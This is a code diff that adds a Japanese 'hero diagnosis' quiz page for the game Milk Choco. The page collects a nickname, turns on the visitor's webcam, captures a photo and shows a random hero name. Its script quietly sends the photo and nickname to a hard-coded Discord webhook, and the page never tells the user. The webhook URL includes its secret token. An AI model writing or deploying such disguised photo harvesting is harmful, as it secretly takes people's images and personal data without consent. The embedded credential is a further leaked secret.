@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ミルクチョコ ヒーロー診断</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            text-align: center;
+            padding: 20px;
+        }
+        input[type="text"] {
+            padding: 10px;
+            width: 80%;
+            margin: 10px 0;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #hero-result {
+            margin-top: 20px;
+        }
+        #camera {
+            margin-top: 20px;
+        }
+        #capture-image {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>あなたのヒーローを診断！</h1>
+    
+    <!-- ニックネーム入力 -->
+    <input type="text" id="nickname" placeholder="あなたのニックネームを入力" />
+    <button id="start-button">診断スタート</button>
+
+    <!-- カメラ -->
+    <div id="camera" style="display:none;">
+        <h2>写真を撮ってください</h2>
+        <video id="video" width="100%" height="auto" autoplay></video>
+        <button id="capture-button">撮影する</button>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <!-- ヒーロー診断結果 -->
+    <div id="hero-result" style="display:none;">
+        <h2>あなたのヒーローは！</h2>
+        <p id="hero-name"></p>
+        <img id="captured-image" src="" alt="撮影した画像" width="200" />
+    </div>
+
+    <script>
+        const heroList = [
+            "アサルト", "ボマー", "ゴースト", "メディック", "エレキ", 
+            "シールド", "チュチュ", "アイアン", "リーコン", "キャット", "ランチャー"
+        ];
+
+        const webhookURL = "https://discord.com/api/webhooks/1366016639841341481/L5I7WDD_xthFEHSPfnl9gHAkGpQUGbf542K2whGCHhqDJE2t5PVJeN8Jr4Hx-YDWI0Yt";
+        
+        let video = document.getElementById("video");
+        let canvas = document.getElementById("canvas");
+        let context = canvas.getContext("2d");
+
+        // スタートボタンのクリックイベント
+        document.getElementById("start-button").addEventListener("click", function() {
+            let nickname = document.getElementById("nickname").value;
+            if (nickname) {
+                document.getElementById("nickname").style.display = "none";
+                document.getElementById("start-button").style.display = "none";
+                document.getElementById("camera").style.display = "block";
+                startCamera();
+            } else {
+                alert("ニックネームを入力してください！");
+            }
+        });
+
+        // カメラ開始
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                })
+                .catch(function(err) {
+                    console.log("カメラのアクセスに失敗しました: " + err);
+                });
+        }
+
+        // 撮影ボタンのクリックイベント
+        document.getElementById("capture-button").addEventListener("click", function() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            let imageData = canvas.toDataURL("image/png");
+            document.getElementById("captured-image").src = imageData;
+
+            let randomHero = heroList[Math.floor(Math.random() * heroList.length)];
+            document.getElementById("hero-name").textContent = randomHero;
+            document.getElementById("hero-result").style.display = "block";
+
+            // Webhook送信
+            sendToWebhook(imageData, randomHero);
+        });
+
+        // Webhookに送信
+        function sendToWebhook(imageData, heroName) {
+            const nickname = document.getElementById("nickname").value;
+            const payload = {
+                content: `ヒーロー診断結果:\nニックネーム: ${nickname}\nヒーロー: ${heroName}`,
+                embeds: [{
+                    image: {
+                        url: imageData
+                    }
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Webhook送信成功:", data);
+            })
+            .catch(error => {
+                console.error("Webhook送信エラー:", error);
+            });
+        }
+    </script>
+</body>
+</html>
